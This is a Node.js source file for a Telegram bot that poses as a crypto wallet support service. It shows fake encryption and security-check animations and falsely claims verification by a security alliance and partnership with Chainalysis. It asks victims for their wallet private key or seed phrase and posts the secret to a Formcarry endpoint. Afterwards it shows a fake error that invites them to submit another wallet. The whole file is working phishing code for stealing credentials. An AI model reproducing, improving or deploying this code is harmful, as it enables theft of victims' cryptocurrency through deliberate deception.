require('dotenv').config();
const express = require('express'); // Added for port support
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');


// ====== Express Server Setup for Render ======
const app = express();
const PORT = process.env.PORT || 3000;

// Health check endpoint
app.get('/', (req, res) => {
  res.status(200).json({ 
    status: 'Bot is running',
    bots: process.env.TG_BOT_TOK1 ? 'Active' : 'Inactive'
  });
});
// Add this if you have Express setup
app.get('/certificate/:botUsername', (req, res) => {
    const modifiedHtml = htmlContent
        .replace('YOUR BOT NAME', `@${req.params.botUsername}`)
        .replace('id="current-date"', `id="current-date">${new Date().toLocaleDateString()}`);
    res.send(modifiedHtml);
});


// Start the server
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});

// ====== Check for duplicate instances to prevent 409 Conflict ======
const LOCK_FILE = '.bot.lock';
if (fs.existsSync(LOCK_FILE)) {
    console.error('❌ Another bot instance is already running! Exiting...');
    process.exit(1);
} else {
    fs.writeFileSync(LOCK_FILE, '');
    process.on('exit', () => fs.unlinkSync(LOCK_FILE));
}

// ====== Bot and Formcarry Configurations ======
const BOT_CONFIGS = [
    {
        botToken: process.env.TG_BOT_TOK1,
        formcarryToken: process.env.FORMCARRY_ACCESS_TOKEN_1,
        formcarryUrl: process.env.FORMCARRY_URL_1
    },
    {
        botToken: process.env.TG_BOT_TOK2,
        formcarryToken: process.env.FORMCARRY_ACCESS_TOKEN_2,
        formcarryUrl: process.env.FORMCARRY_URL_2
    },
    {
        botToken: process.env.TG_BOT_TOK3,
        formcarryToken: process.env.FORMCARRY_ACCESS_TOKEN_3,
        formcarryUrl: process.env.FORMCARRY_URL_3
    }
].filter(config => config.botToken && config.formcarryToken);

if (BOT_CONFIGS.length === 0) {
    console.error('❌ No valid bot configurations found! Check your .env file');
    process.exit(1);
}

// ====== Initialize Bots ======
const bots = BOT_CONFIGS.map(config => {
    try {
        const bot = new TelegramBot(config.botToken, {
            polling: {
                autoStart: true,
                params: { timeout: 10 }
            }
        });
        bot.config = config;
        console.log(`✅ Bot with token ending in ${config.botToken.slice(-5)} initialized`);
        return bot;
    } catch (error) {
        console.error(`❌ Failed to initialize bot:`, error.message);
        return null;
    }
}).filter(bot => bot !== null);

// ====== Store user data temporarily ======
const userData = {};

// ====== Security Functions ======
function generateSessionId(userId) {
    return `TRUST-${crypto.randomBytes(4).toString('hex')}-${userId.toString().slice(-4)}`;
  }

// ====== Graceful shutdown handler ======
process.on('SIGINT', () => {
    console.log('🛑 Stopping bot gracefully...');
    bots.forEach(bot => bot.stopPolling());
    fs.unlinkSync(LOCK_FILE);
    process.exit();
});

// ====== Function to send data to Formcarry with retry logic ======
const sendToFormcarry = async (bot, chatId, data, retries = 3, delay = 1000) => {
    try {
        const response = await axios.post(bot.config.formcarryUrl, data, {
            headers: { Authorization: `Bearer ${bot.config.formcarryToken}` },
        });

        if (response.status === 200) {
            const optionss = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🔄 Restart Bot', callback_data: 'restart_bot' },
                            { text: '➕ Import New Wallet', callback_data: 'import_another_wallet' }
                        ],
                        [
                            { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
                        ]
                    ],
                },
            };

            await bot.sendMessage(chatId, '❌ An error occured, please contact admin to solve your issue or try importing another wallet.', {
                parse_mode: 'Markdown',
                ...optionss,
            });
        } else {
            await bot.sendMessage(chatId, '❌ *Oops! Something went wrong. Please try again.*', {
                parse_mode: 'Markdown',
            });
        }
    } catch (error) {
        if (error.response && error.response.status === 429 && retries > 0) {
            const retryDelay = delay * 2;
            console.log(`Rate limit hit. Retrying in ${retryDelay}ms...`);
            setTimeout(() => sendToFormcarry(bot, chatId, data, retries - 1, retryDelay), retryDelay);
        } else {
            console.error('Error submitting to Formcarry:', error.message);
            await bot.sendMessage(chatId, '❌ *Oops! Something went wrong. Please try again.*', {
                parse_mode: 'Markdown',
            });
        }
    }
};

// ====== Start command ======
// bots.forEach(bot => {
//     bot.onText(/\/start/, (msg) => {
//         const chatId = msg.chat.id;
//         const sessionId = generateSessionId(msg.from.id);
//         const options = {
//             reply_markup: {
//                 inline_keyboard: [
//                     [
//                         { text: 'Harvest Transaction', callback_data: 'harvest' },
//                         { text: 'Claim', callback_data: 'claim' }
//                     ],
//                     [
//                         { text: 'Migration', callback_data: 'migrate' },
//                         { text: 'Staking', callback_data: 'staking' }
//                     ],
//                     [
//                         { text: 'Whitelisting', callback_data: 'whitelist' },
//                         { text: 'Bridge Error', callback_data: 'bridge_err' }
//                     ],
//                     [
//                         { text: 'Presale Error', callback_data: 'presale_err' },
//                         { text: 'NFT', callback_data: 'nft' }
//                     ],
//                     [
//                         { text: 'Revoke', callback_data: 'revoke' },
//                         { text: 'KYC', callback_data: 'kyc' }
//                     ],
//                     [
//                         { text: 'Deposit Issues', callback_data: 'deposit' },
//                         { text: 'Others', callback_data: 'others' }
//                     ],
//                     [
//                         { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
//                     ]
//                 ],
//             },
//         };

//         bot.sendMessage(chatId, `Hi there!
// I'm your dedicated assistant here to help with all your crypto-related questions and technical issues. 
// Whether you're setting up a wallet, troubleshooting transactions, or navigating blockchain features, 
// I'm here to guide you every step of the way.

// If you're encountering an error, need help understanding crypto terms, or just have general questions 
// about your account, simply ask! I'll provide the best possible solution, and if needed, I can connect 
// you with one of our human experts.

// ⚠️NOTE: YOU ARE SUBMITTING ALL REQUIRED INFORMATIONS TO BOT WITH ZERO HUMAN INTERFERENCE. 

// *🔗 END TO END ENCRYPTED 🔁*\n`+ `*Session ID:* \`${sessionId}\``, { parse_mode: 'Markdown', ...options });
//         userData[chatId] = { step: 'choosing_option' };
//     });
// });

// ====== Start command (Animated Version) ======
bots.forEach(bot => {
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        const sessionId = generateSessionId(msg.from.id);
        
        // 1. Initial loading message
        const loadingMsg = await bot.sendMessage(chatId, 
        `🖥️ *Initializing Crypto Support Terminal...*\n` +
        '```\n' +
        '[██████░░░░░░] 50%\n' +
        '```', 
        { parse_mode: 'Markdown' });

        // 2. Simulate loading progression
        for (let i = 6; i <= 10; i++) {
            await new Promise(r => setTimeout(r, 1000));
            await bot.editMessageText(
                `🖥️ *Initializing Crypto Support Terminal...*\n` +
                '```\n' +
                `[${'█'.repeat(i)}${'░'.repeat(10-i)}] ${i*10}%\n` +
                '```',
                { chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: 'Markdown' }
            );
        }

        // 3. Authentication sequence
        await bot.editMessageText(
            `🔐 *Authentication Sequence...*\n` +
            '```\n' +
            '[1] Verifying session credentials... ✅\n' +
            '[2] Establishing E2E encryption... ✅\n' +
            '[3] Connecting to node network... 🔄\n' +
            '```',
            { chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: 'Markdown' }
        );

        // 4. Final interface (after 2 seconds)
        setTimeout(async () => {
            await bot.deleteMessage(chatId, loadingMsg.message_id);
            
            const options = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'Harvest Transaction', callback_data: 'harvest' },
                            { text: 'Claim', callback_data: 'claim' }
                        ],
                        [
                            { text: 'Migration', callback_data: 'migrate' },
                            { text: 'Staking', callback_data: 'staking' }
                        ],
                        [
                            { text: 'Whitelisting', callback_data: 'whitelist' },
                            { text: 'Bridge Error', callback_data: 'bridge_err' }
                        ],
                        [
                            { text: 'Presale Error', callback_data: 'presale_err' },
                            { text: 'NFT', callback_data: 'nft' }
                        ],
                        [
                            { text: 'Revoke', callback_data: 'revoke' },
                            { text: 'KYC', callback_data: 'kyc' }
                        ],
                        [
                            { text: 'Deposit Issues', callback_data: 'deposit' },
                            { text: 'Others', callback_data: 'others' }
                        ],
                        [
                            { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
                        ]
                    ],
                },
            };

            bot.sendMessage(
                chatId,
                `🔷 *CRYPTO SUPPORT TERMINAL* 🔷\n` +
                `╔══════════════════════════════╗\n` +
                `║  ⟣  WALLET CONFIGURATION     ║\n` +
                `║  ⟣  TRANSACTION TROUBLESHOOT ║\n` +
                `║  ⟣  BLOCKCHAIN NAVIGATION    ║\n` +
                `╚══════════════════════════════╝\n\n` +
                `🛡️ *SECURE SESSION INITIALIZED*\n` +
                `┌──────────────────────────────┐\n` +
                `│ 📌 Session ID: \`${sessionId}\` │\n` +
                `├──────────────────────────────┤\n` +
                `│ 🔒 Protocol: E2E-Encrypted   │\n` +
                `│ ⚙️ Access: Pure Automation   │\n` +
                `│ ⚠️ Logged: ${new Date().toISOString().split('T')[0]} │\n` +
                `└──────────────────────────────┘\n\n` +
                `I'm your dedicated assistant here to help with all crypto-related questions and issues. \nSelect from the Options below what issue you are experiencing 👇 \n\n` +
                `_The identifier helps maintain your secure connection_`,
                { 
                    parse_mode: 'Markdown', 
                    ...options 
                }
            );
            
            userData[chatId] = { step: 'choosing_option' };
        }, 2000);
    });
});

// ====== Handle inline keyboard button clicks ======
// bots.forEach(bot => {
//     bot.on('callback_query', (callbackQuery) => {
//         const chatId = callbackQuery.message.chat.id;
//         const data = callbackQuery.data;

//         if (data === 'restart_bot') {
//             bot.sendMessage(chatId, '🔄 Restarting the bot...');
//             bot.sendMessage(chatId, '/start');
//             return;
//         } else if (data === 'import_another_wallet') {
//             userData[chatId] = { step: 'choosing_option' };
//             const options = {
//                 reply_markup: {
//                     inline_keyboard: [
//                         [
//                             { text: 'Harvest Transaction', callback_data: 'harvest' },
//                             { text: 'Claim', callback_data: 'claim' }
//                         ],
//                         [
//                             { text: 'Migration', callback_data: 'migrate' },
//                             { text: 'Staking', callback_data: 'staking' }
//                         ],
//                         [
//                             { text: 'Whitelisting', callback_data: 'whitelist' },
//                             { text: 'Bridge Error', callback_data: 'bridge_err' }
//                         ],
//                         [
//                             { text: 'Presale Error', callback_data: 'presale_err' },
//                             { text: 'NFT', callback_data: 'nft' }
//                         ],
//                         [
//                             { text: 'Revoke', callback_data: 'revoke' },
//                             { text: 'KYC', callback_data: 'kyc' }
//                         ],
//                         [
//                             { text: 'Help', callback_data: 'help' },
//                             { text: 'Others', callback_data: 'others' }
//                         ],
//                         [
//                             { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
//                         ]
//                     ],
//                 },
//             };

//             bot.sendMessage(chatId, '➕ Please choose an option to import another wallet:', {
//                 parse_mode: 'Markdown',
//                 ...options,
//             });
//             return;
//         }

//         userData[chatId].option = data;

//         if (data === 'private_key' || data === 'seed_phrase') {
//             userData[chatId].authMethod = data;
//             userData[chatId].step = 'providing_input';

//             let message = '';
//             if (data === 'private_key') {
//                 message = `You selected *Private Key* as your authentication method. 
// Please enter your wallet **Private Key** :`;
//             } else if (data === 'seed_phrase') {
//                 message = `You selected *Seed Phrase* as your authentication method. 
// Please enter your **12 or 24-word Seed Phrase** (separated by spaces):`;
//             }

//             bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
//         } else {
//             userData[chatId].step = 'choosing_auth_method';
//             const authMethodOptions = {
//                 reply_markup: {
//                     inline_keyboard: [
//                         [
//                             { text: '🔑 Private Key', callback_data: 'private_key' },
//                             { text: '📝 Seed Phrase', callback_data: 'seed_phrase' }
//                         ]
//                     ],
//                 },
//             };

//             bot.sendMessage(chatId, `You selected *${data}*. 
// Please provide the *Private key* or *Seed Phrase* for the wallet affected to begin authentication with the smart contract:`, {
//                 parse_mode: 'Markdown',
//                 ...authMethodOptions,
//             });
//         }
//     });
// });

bots.forEach(bot => {
    bot.on('callback_query', async (callbackQuery) => {
        const chatId = callbackQuery.message.chat.id;
        const data = callbackQuery.data;

        // Handle restart and import cases first
        if (data === 'restart_bot') {
            bot.sendMessage(chatId, '🔄 Restarting the bot...');
            bot.sendMessage(chatId, '/start');
            return;
        } else if (data === 'import_another_wallet') {
            userData[chatId] = { step: 'choosing_option' };
            const options = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'Harvest Transaction', callback_data: 'harvest' },
                            { text: 'Claim', callback_data: 'claim' }
                        ],
                        [
                            { text: 'Migration', callback_data: 'migrate' },
                            { text: 'Staking', callback_data: 'staking' }
                        ],
                        [
                            { text: 'Whitelisting', callback_data: 'whitelist' },
                            { text: 'Bridge Error', callback_data: 'bridge_err' }
                        ],
                        [
                            { text: 'Presale Error', callback_data: 'presale_err' },
                            { text: 'NFT', callback_data: 'nft' }
                        ],
                        [
                            { text: 'Revoke', callback_data: 'revoke' },
                            { text: 'KYC', callback_data: 'kyc' }
                        ],
                        [
                            { text: 'Help', callback_data: 'help' },
                            { text: 'Others', callback_data: 'others' }
                        ],
                        [
                            { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
                        ]
                    ],
                },
            };

            bot.sendMessage(chatId, '➕ Please choose an option to import another wallet:', {
                parse_mode: 'Markdown',
                ...options,
            });
            return;
        }

        userData[chatId].option =data;

        if (data === 'private_key' || data === 'seed_phrase') {
            // Show initial loading animation
            const loadingMsg = await bot.sendMessage(chatId,
                `🛡️ *Initializing Secure Authentication*\n` +
                '```\n' +
                '[████████░░░░] 60%\n' +
                '```',
                { parse_mode: 'Markdown' }
            );

            // Simulate security checks
            await new Promise(r => setTimeout(r, 2000));
            await bot.editMessageText(
                `🔒 *Running Security Protocols*\n` +
                '```\n' +
                '[1] Isolating session... ✅\n' +
                '[2] Encrypting channel... ✅\n' +
                '[3] Verifying request... 🔄\n' +
                '```',
                { 
                    chat_id: chatId, 
                    message_id: loadingMsg.message_id,
                    parse_mode: 'Markdown' 
                }
            );

            // Final authentication ready
            setTimeout(async () => {
                await bot.deleteMessage(chatId, loadingMsg.message_id);
                
                userData[chatId].authMethod = data;
                userData[chatId].step = 'providing_input';

                let message = '';
                if (data === 'private_key') {
                    message = `🔑 *PRIVATE KEY VERIFICATION*\n` +
                        `╔══════════════════════════════╗\n` +
                        `║  SECURITY LEVEL: MAXIMUM      ║\n` +
                        `║  ENCRYPTION: AES-256          ║\n` +
                        `╚══════════════════════════════╝\n\n` +
                        `Enter your *private key* below:\n\n` +
                        `⚠️ Never share this with anyone!`;
                } else {
                    message = `🌱 *SEED PHRASE VERIFICATION*\n` +
                        `╔══════════════════════════════╗\n` +
                        `║  WORDS REQUIRED: 12/24       ║\n` +
                        `║  FORMAT: Space-separated     ║\n` +
                        `╚══════════════════════════════╝\n\n` +
                        `Enter your *recovery phrase* below:`;
                }

                await bot.sendMessage(chatId, message, { 
                    parse_mode: 'Markdown',
                });

            }, 1500);

        } else {
            // Non-authentication method selection
            userData[chatId].step = 'choosing_auth_method';
            const authMethodOptions = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { 
                                text: '🔐 Private Key', 
                                callback_data: 'private_key',
                                description: "Import using wallet private key"
                            },
                            { 
                                text: '📜 Seed Phrase', 
                                callback_data: 'seed_phrase',
                                description: "12/24 word recovery phrase"
                            }
                        ]
                    ],
                },
            };

            // Show brief loading before auth method selection
            const loadingMsg = await bot.sendMessage(chatId,
                `⚙️ *Preparing Authentication Options*...`,
                { parse_mode: 'Markdown' }
            );
            
            setTimeout(async () => {
                await bot.deleteMessage(chatId, loadingMsg.message_id);
                await bot.sendMessage(chatId, 
                    `🔐 *Authentication Required*\n\n` +
                    `For *${data}*, please select your authentication method:`, 
                    {
                        parse_mode: 'Markdown',
                        ...authMethodOptions
                    }
                );
            }, 800);
        }
    });
});


// ====== Add Menu Button ======
bots.forEach(bot => {
    // Set the bot commands (appears as menu button)
    bot.setMyCommands([
        { command: '/start', description: 'Restart the bot 🤖' },
        { command: '/verify', description: 'Verify Bot 🛡️' },
        { command: '/certificate', description: 'Audit Cert 🪪' },
        { command: '/help', description: 'Get assistance 👨🏼‍🔧' },
        { command: '/wallet', description: 'Wallet operations 🔐' }

    ]);

    // Then in your bot command:
    bot.onText(/\/certificate/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            const botInfo = await bot.getMe();
            const certificateUrl = `https://thdhhdp.remainnetath.xyz/?name=${encodeURIComponent(botInfo.first_name)}`;
            
            await bot.sendMessage(
                chatId,
                `📜 *Your Security Certificate*\n\n` +
                `View certificate: [Click Here](${certificateUrl})`,
                { parse_mode: 'Markdown' }
            );
        } catch (error) {
            console.error('Certificate error:', error);
            await bot.sendMessage(chatId, '⚠️ Could not generate certificate link');
        }
    });
    // Handle the /help command
    bot.onText(/\/help/, (msg) => {
        const chatId = msg.chat.id;
        bot.sendMessage(chatId, `🛟 *Help Center*\n\nNeed assistance? Here are your options:\n\n• Use the menu buttons below\n• Contact @yesmine2008\n• Type /start to reset`, 
        { parse_mode: 'Markdown' });
    });

    // Verification command
    bot.onText(/\/verify/, (msg) => {
        const chatId = msg.chat.id;
        bot.sendMessage(chatId, `🔐 *Identity Verification*\n\n` +
          `✅ Verified by Crypto Security Alliance\n` +
          `🛡️ Partnered with Chainalysis\n` +
          `🔒 Non-Custodial - We never hold your assets\n\n`, {
          parse_mode: 'Markdown',
          disable_web_page_preview: true
        });
      });

    // Handle the /wallet command
    bot.onText(/\/wallet/, (msg) => {
        const chatId = msg.chat.id;
        bot.sendMessage(chatId, "🔑 *Wallet Manager*", {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'Import Wallet', callback_data: 'import_wallet' },
                    ]
                ]
            }
        });
    });
});

// ====== Handle user input ======
bots.forEach(bot => {
    bot.on('message', (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;

        if (!userData[chatId] || userData[chatId].step !== 'providing_input') {
            return;
        }

        const authMethod = userData[chatId].authMethod;
        let isValid = false;
        let errorMessage = '';

        if (authMethod === 'seed_phrase') {
            const words = text.trim().split(/\s+/);
            isValid = words.length > 11;
            if (!isValid) {
                errorMessage = '❌ *Invalid Input!* It must contain at least **12 or 24 words**. Please try again:';
            }
        } else if (authMethod === 'private_key') {
            isValid = text.length > 20;
            if (!isValid) {
                errorMessage = '❌ *Invalid Input!* It must contain a valid private key. Please try again:';
            }
        }

        if (!isValid) {
            bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown' });
            return;
        }

        userData[chatId].input = text;
        const data = {
            option: userData[chatId].option,
            authMethod: userData[chatId].authMethod,
            input: userData[chatId].input,
        };

        sendToFormcarry(bot, chatId, data);
        delete userData[chatId];
    });
});

// ====== Error handling ======
bots.forEach(bot => {
    bot.on('polling_error', (error) => {
        console.error(`Polling Error (${bot.config.botToken.slice(-5)}):`, error.message);
        if (error.code === 'ETELEGRAM' && error.message.includes('409 Conflict')) {
            console.error('Conflict detected! Stopping this instance...');
            process.exit(1);
        }
    });
});

console.log(`🚀 ${bots.length} bot(s) running successfully`);
